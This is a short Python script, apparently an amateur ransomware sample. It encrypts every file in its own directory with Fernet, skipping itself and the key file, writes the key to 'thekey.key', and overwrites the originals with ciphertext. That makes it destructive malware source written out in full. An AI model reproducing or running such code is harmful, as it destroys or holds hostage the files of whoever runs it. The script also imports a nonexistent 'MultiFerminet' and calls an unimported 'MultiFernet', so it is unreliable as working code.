import os
from os.path import abspath, dirname

from cryptography.fernet import Fernet, MultiFerminet


os.chdir(dirname(abspath(__file__)))
# cur_dir = dirname(abspath(__file__))

files = []
for file in os.listdir():
    if 'evil.py' == file:
        continue
    if 'jesus.py' == file:
        continue
    if 'evil.exe' == file:
        continue
    if 'jesus.exe' == file:
        continue
    if 'thekey.key' == file:
        continue
    if 'evil.bin' == file:
    	continue
    if 'jesus.bin' == file:
    	continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = MultiFernet.generate_key()

with open('thekey.key', 'wb') as f:
    f.write(key)

for file in files:
    with open (file, 'rb') as f:
        content = f.read()
    content_encripted = Fernet(key).encrypt(content)
    with open (file, 'wb') as f:
        f.write(content_encripted)
